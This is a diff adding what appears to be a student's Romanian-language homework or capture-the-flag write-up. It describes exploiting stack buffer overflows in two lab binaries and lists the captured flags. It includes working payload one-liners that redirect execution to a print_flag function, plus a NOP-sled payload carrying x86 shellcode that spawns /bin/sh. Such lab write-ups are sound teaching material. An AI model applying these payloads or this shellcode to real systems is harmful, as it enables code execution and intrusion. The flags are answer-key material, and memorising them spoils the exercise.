@@ -1,0 +1,35 @@
+NICE_FLAG{db782ad713f5e3bf5752e8c01c177711}
+NAUGHTY_FLAG{545ee99bf718fb83d05d1ff4cb6f9b5d}
+La prima cerinta, modul in care am aflat care functie este vulnerabila in
+binarul nice a fost sa folosesc utilitarul Ghidra pentru a analiza functiile
+apelate de catre functia main. Am parcurs codul fiecarei functii si am obs ca
+functia de la adresa 0x080492f8 este vulnerabila deoarece se citeste mai mult
+decat e alocat pe stiva, deci putem face un attack buffer overflow.
+La a doua cerinta, folosind informatia de la prima am generat un payload care
+suprascrie functia cu probleme si functia de dinaintea ei, si ebp ul si am
+suprascris si eip ul cu adresa functiei print_flag:0x08049291. Faptul ca am
+pus 4 bytes pt suprascrierea lui ebp face programul sa mai dea un mesaj
+stopped. Ca sa scrii eip ul trebuie sa schimbi si ebp ul de pe stiva.
+La a treia cerinta, prin analiza, vedem ca functia a 4-a primeste ca argument
+un pointer la functie si din nou putem sa suprascriem incat sa ajungem
+sa dam ca parametru la functie adresa lui print_flag. Pentru a face asta,
+trebuie ca int urile care insotesc fiecare functie sa evite exit ul din
+program, neindeplinind conditia de iesire, adica suprascriem inturile cu care
+se face CMP pe codul assembly. Am folosit objdump pentru a observa forma fara
+semn a valorii de comparat. La a 4-a cerinta bonus shellcode am facut un NOP Sled.
+Felul in care am gandit a fost ca in loc ca pointerul de functie sa ma trimita
+la o functie, acesta sa ma trimita inapoi la o adresa din buffer unde o sa am
+un shellcode. Shellcode-ul mi-a rezultat dintr-un program simplu pe care l-am
+facut sa imi dea un apel de system cu /bin/sh si am translatat pur si simplu
+din objdump instructiunile in hexa echivalente cu codul masina efectiv. Ala e
+practic shellcode-ul. Ca sa stiu la ce adresa de memorie sa fiu trimis, am
+pus un breakpoint in functia care iti permitea atacul, la adresa 0x0804935c.
+Apoi am rulat cu o adresa gresita, normal dadea segfault, dar ma uit cu explore in gdb
+x/300x $esp si imi caut unde e secventa shellcode si reglez din nou adresa. Apoi am
+rulat si merge in gdb doar. gdb ./naughty si apoi run < naughty_shellcode.
+Comenzile pentru a genera primele 2 payload-uri sunt:
+python -c 'print "A"*74+"\xe7\x7a\xce\xd8"+"A"+"A"*37+"\x44\x1c\xa2\x1c"+"A"*55+"A"*178+"\xfa\x44\xd8\x5b"+"A"*80+"A"*389+"\xb1\x62\x5d\xca"+"A"*61+"\x91\x92\x04\x08"' >naughty_payload
+python -c 'print "A"*211+"A"*382+"A"*4+"\x91\x92\x04\x08"' > nice_payload
+Comanda pentru a genera payload shellcode naughty:
+python -c 'print "\x90"*74+"\xe7\x7a\xce\xd8"+"\x90"+"\x90"*37+"\x44\x1c\xa2\x1c"+"\x90"*55+"\x90"*178+"\xfa\x44\xd8\x5b"+"\x90"*80+"\x90"*389+"\xb1\x62\x5d\xca"+"\x90"*6+ "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" +"\x5c\xd1\xff\xff"' > naughty_shellcode
+
